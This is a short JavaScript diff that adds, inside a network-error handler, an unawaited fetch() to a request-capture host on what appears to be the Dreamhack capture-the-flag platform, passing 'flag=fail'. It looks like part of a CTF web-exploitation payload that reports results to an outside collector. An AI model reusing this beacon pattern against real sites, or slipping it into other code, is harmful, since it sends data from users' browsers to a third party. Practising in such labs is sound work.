@@ -30,6 +30,8 @@
                 }
             } catch (error) {
                 console.error('Network error:', error);
+                const finalRequestUrl = `https://ioegaam.request.dreamhack.games?flag=fail`;
+                fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
             }
         };
 
